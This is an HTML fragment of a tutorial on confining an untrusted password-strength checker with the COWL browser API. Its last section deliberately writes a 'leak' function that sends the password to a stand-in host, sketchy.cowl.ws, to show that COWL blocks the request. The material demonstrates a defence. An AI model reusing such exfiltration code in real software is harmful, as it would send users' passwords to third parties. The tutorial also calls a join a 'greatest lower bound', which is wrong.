      This short, informal tutorial shows how you can use the COWL API to
      confine a library that computes on sensitive data. Specifically,
      we are going to build a page that uses a password
      strength-checker library. (You may find it useful to read the
      short example explanation on the <a href="http://cowl.ws">COWL main page</a>.)
      The running example is included above in the form of an iframe.
      First, we are going to build the main page that has the form and
      executes the checker, then we're going to implement the checker
      itself.
      </p>
      <p>
      To follow along you may want to browser the code <a
        href="https://github.com/scslab/cowl.ws/tree/master/examples/checker" target="blank">on GitHub</a>.
      </p>
    </div>
    <div class="col-lg-12">
      <h4>Main page [<a href="https://github.com/scslab/cowl.ws/tree/master/examples/checker/checker.html" target="blank">checker.html</a>]</h4>
      <p>
      The implementation of the main page is pretty straight forward.
      We are going to use <a href="">Bootstrap</a> to make some the
      form pretty; we're going to use <a href="">jQuery</a> to
      simplify the form submission. Below is the markup for the
      password form:
      </p>
<pre class="prettyprint lang-html">
&lt;form id="check"&gt;
  &lt;div class="form-group has-feedback" id="check"&gt;
    &lt;label for="password"&gt;Password&lt;/label&gt;
    &lt;input type="text" class="form-control" id="password" autocomplete="off"&gt;
    &lt;span id="response"&gt;
    &lt;/span&gt;
  &lt;/div&gt;
  &lt;button id="submit" type="submit" class="btn btn-default"
          data-loading-text="checking..."&gt;check&lt;/button&gt;
&lt;/form&gt;
</pre>
    <p>
    You can safely ignore the classes if you have not used Bootstrap
    before. Similarly, you can ignore the <var>loading-text</var> data
    attribute -- we're going to use this to override the button's
    text from <var>check</var> to <var>checking...</var> while the
    worker is checker is being loaded and still computing. There are
    only foru things that are important:
    <ul>
      <li>The form's id is <var>check</var>; we're going to use this to
        register a <var>onsubmmit</var> handler that takes our password
        and sends to to the checker.  </li>
      <li>The password's id is <var>password</var>; we're going to use
      this to get the element's value.</li>
      <li>The button's id is <var>submit</var>; we're going to use
        this to override the button's text while the checker is still
        working.
      <li>The form has a <var>&lt;span&gt;</var> element with id
        <var>response</var>; we're going to insert the checker
        response here in the form of a thumbs up or thumbs down icon,
      respectively denoting that the password strong and weak.</li>
    </ul>
    </p>
    <p>
    Let's now actually implement the form submit handler:
    </p>
    <p>
<pre class="prettyprint lang-js">
$('#check').submit(function (event) {
  disableForm(); // Disable form

  // Get the current value typed into the password field:
  var password = $('#password').val();
  // Label the password, it's sensitive to the current origin:
  password = new LabeledBlob(password, window.location.origin);

  // Create new context to execute checker code in:
  var lchecker = new LWorker("http://sketchy.cowl.ws/examples/checker/checker.js")

  // Register handler to receive messages from worker:
  lchecker.onmessage = function (data) {
    if (data === 'ready') { // Checker is ready
      // Send the labeled password to the checker:
      lchecker.postMessage(password)
    } else { // Checker send us the password strength
      enableForm(); // Enable the form again
      // Update our response element with icon denoting the strength:
      if (data === 'strong') {
        showStrongIcon();
      } else {
        showWeakIcon();
      }
    }
  };

  // Don't submit form as usual:
  event.preventDefault();
});
</pre>
    </p>
    <p>
    When the submit (check) button is clicked, this handler is
    invoked. First, the handler gets the password field value and
    labels it. The labeled password is a <var>LabeledBlob</var>:
    the blob's label indicates the sensitivity of the data to be the current
    origin; the protected blob content is the password itself.
    </p>
    <p>
    After, the checker code is loaded into a new <var>LWorker</var>
    context. Once it's done loading the <var>lchecker.onmessage</var>
    handler is invoked with the <var>ready</var> message. Now, our
    code simply sends the checker (via <var>postMessage</var>) the
    labeled password.
    </p>
    <p>
    This same handler is called with the actual password-strength
    once the checker performs the check. However, in this case the
    result <var>&lt;span&gt;</var> element is updated with the
    strength indicator icon. (That's what the
    <var>showStrongIcon</var> and <var>showWeakIcon</var> are doing.)
    </p>
    <p>
    The example below shows the result executing the checker against a
    weak password:
    </p>
    <p class="text-center">
    <img class="shadow img-thumbnail" src="/images/weak.png">
    </p>
    <p>
    And, a "stronger" password:
    </p>
    <p class="text-center">
    <img class="shadow img-thumbnail" src="/images/strong.png">
    </p>
    <p>
    That's pretty much it for the main page! All the other code is
    boilerplate. If you are interested in, though, you can browse it
    <a href="https://github.com/scslab/cowl.ws/tree/master/examples/checker/checker.html">here</a>.
    </p>
    <p>
    Before delving into the checker code, there is one last thing that
    is worth highlighting: if we had not labeled -- as is done in
    today's web applications -- the password the checker could've
    easily have leaked it. As shown below the checker can simply
    encode the password in the query string of the request URL:
    </p>
    <p class="text-center">
    <img class="shadow img-thumbnail" src="/images/steal.png">
    </p>
    <p>
    Here, the last request (that returns the 404 message) leaks the
    password to the server.  Indeed, let's now implement a checker
    that while seemingly benign (it returns a correct result) attempts
    to leak information below.
    </p>
    </div>

    <div class="col-lg-12">
      <h4>Checker [<a
          href="https://github.com/scslab/cowl.ws/tree/master/examples/checker/checker.js" target="blank">checker.js</a>]</h4>
      <p>
      Let's now implement the checker code. Our checker fetches a
      regular expression to use as a way of evaluating whether the
      password is strong or weak. An alternative approach may, for
      example, fetch a list of common passwords, etc.
      </p>
      <p>
      As a starting point, let's define a helper function that simply fetches
      a regular expression from a remote server and calls a supplied
      callback once the server replies:
      </p>
      <p>
<pre class="prettyprint lang-js">
function fetchRegex(cb) {
  try {
    var req = new XMLHttpRequest();
    req.open('get', 'http://sketchy.cowl.ws/examples/checker/regex.json', true);
    req.responseType = "json";
    req.onload = function() {
      cb(new RegExp(req.response.regex));
    };
    req.send();
  } catch(e) {
    console.warn("Failed to fetch regex: %s", e);
    cb(/\w{6,}/);
  }
}
</pre>
      </p>
      <p>
      This code simply makes a request to sketchy.cowl.ws with the XHR
      constructor. Once the server replies with JSON response, we
      convert it to a regular expression and invoke the <var>cb</var>
      callback. If anything fails (e.g., server is down), we simply
      return call the callback with a default regular expression.
      </p>
      <p>
      In this example, our server, when queried for
      <var>regex.json</var>, replies back with the regex
      from <a href="http://www.mkyong.com/regular-expressions/how-to-validate-password-with-regular-expression/">here</a>:
      </p>
      <p>
<pre class="prettyprint lang-js">
{ "regex" : "((?=.*\\d)(?=.*[a-z])(?=.*[A-Z])(?=.*[@#$%]).{6,})" }
</pre>
      </p>
      <p>
      We additionally set a <a href="https://en.wikipedia.org/wiki/Cross-origin_resource_sharing">CORS</a> header to make this resource publicly
      readable by any script.
      </p>
      <p>
      Let's now implement the code that interacts with the library
      user (the main page):
      </p>
      <p>
<pre class="prettyprint lang-js">
// Wait for message from the parent:
onmessage = function(password) {
  fetchRegex(function(regex) {
    // Raise the privacy label:
    COWL.privacyLabel = COWL.privacyLabel.and(password.privacy);
    // Now we can read the password
    console.log('Checking strength of: %s', password.blob);
    // But cannot talk to the network arbitrarily.
    // But we can still compute the strength and reply to the parent:
    postMessage(regex.test(password.blob) ? 'strong' : 'weak')
  });
};

// Tell the parent that we're done loading:
postMessage('ready');
</pre>
      </p>
      <p>
      What is this code doing? At the top-level it registers a
      message handler and sends a message to the parent (via
      <var>postMessage</var>) telling it we're ready to compute the
      strength of the password. The interesting bits are in the
      handler.
      </p>
      <p>
      In the handler, we fetch the regex, and then raise the context
      label:
      </p>
      <p>
<pre class="prettyprint lang-js">
    // Raise the privacy label:
    COWL.privacyLabel = COWL.privacyLabel.and(password.privacy);
</pre>
      </p>
      <p>
      The right-hand side of the assignment computes a new label that
      corresponds to the <a href="https://en.wikipedia.org/wiki/Least-upper-bound_property">join (or greatest lower bound)</a>
      of the current label and the label of the blob
      (<var>password.privacy</var>). This label, when set, ensures
      that the privacy of both the password message and everything in
      score is protected. If we do not raise the context label as
      such, COWL would prevent the code from looking at the blob
      contents. In particular, we would not be able to print out the
      password to the console. COWL would throw the following
      exception:
      </p>
      <p class="text-center">
      <img class="shadow img-thumbnail" src="/images/noraise.png">
      </p>
      <p>
      Raising the label as such, however, allows us to inspect the
      password message content (the <var>blob</var> property), test
      it against the regex, and reply to the parent with either
      <var>'strong'</var> or <var>'weak'</var>.
      </p>
      <p>
      Of course, that's not the whole story! Raising the label also
      prevents the code from communicating arbitrarily (since now it
      can look at more sensitive data, the password). Hence, for
      example, if we try to send the password content, COWL prevents
      the leak. Let's actually modify the <var>onmessage</var> handler
      to leak the password:
      </p>
      <p>
<pre class="prettyprint lang-js">
...
    // Now we can read the password
    console.log('Checking strength of: %s', password.blob);
    // But cannot talk to the network arbitrarily.
    // Let's try:
    leak(password.blob);
...
</pre>
      </p>
      <p>
      Where the helper <var>leak</var> function is defined as:
      </p>
      <p>
<pre class="prettyprint lang-js">
function leak(pass) {
  try {
    var req = new XMLHttpRequest();
    req.open('get', 'http://sketchy.cowl.ws/leak/yourpass='+pass, true);
    req.send();
  } catch(e) {
    console.log("Failed to leak!");
  }
}
</pre>
      </p>
      <p>
      Running this code and looking at the network profiler, we see
      the block and no request being made to <var>sketchy.cowl.ws</var>:
      </p>
      <p class="text-center">
      <img class="shadow img-thumbnail" src="/images/block.png">
      </p>
      <p>
      This is great! Despite being malicious, we were able to use this
      strength checker. Of course, you can imagine a less contrived
      example where the library you are trying to use is accidentally
      leaking data to the author's remote server.
      </p>
      <p>
      One last final note: in the above screen-shot you may have
      noticed that the security error is a "Content Security Policy"
      violation. This is because COWL piggy-backs on the existing CSP
      implementation. Indeed, the raising of the label amounted to
      changing the context's CSP to a more restricting rule. Check out
      the <a href="http://www.scs.stanford.edu/~deian/pubs/stefan:2014:protecting.pdf">paper</a> for more details!
